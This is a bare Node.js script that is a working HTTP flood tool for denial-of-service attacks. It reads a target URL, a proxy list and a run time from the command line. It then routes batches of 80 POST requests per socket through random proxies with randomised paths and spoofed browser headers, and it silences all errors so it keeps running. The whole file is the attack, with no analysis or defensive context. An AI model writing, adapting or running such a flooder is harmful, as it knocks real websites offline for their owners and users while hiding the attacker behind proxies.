process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
const net = require('net');
const fs = require('fs');
const url = require('url');
var proxies = fs.readFileSync(process.argv[3], 'utf-8').toString().replace(/\r/g, '').split('\n');
var tarPOST = process.argv[2];
var parsed = url.parse(tarPOST);

setTimeout(() => {
process.exit(1);
}, process.argv[4] * 1000);

const AllUA = [
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.3665445a9e-1bd"
    ]

setInterval(function() {
    for(var random = ''; random.length < 5;) random += Math.random().toString(36).substr(2);
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(8000);
    for (let j = 0; j < 80; j++) {
    socket.write('POST ' + tarPOST + random +' HTTP/1.1\r\nHost: '+ parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + AllUA[Math.floor(Math.random() * AllUA.length)] + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n');
    }
        socket.on('data', function() {
        setTimeout(function() {
            socket.destroy();
            return delete socket;
        }, 8000);
    })
});
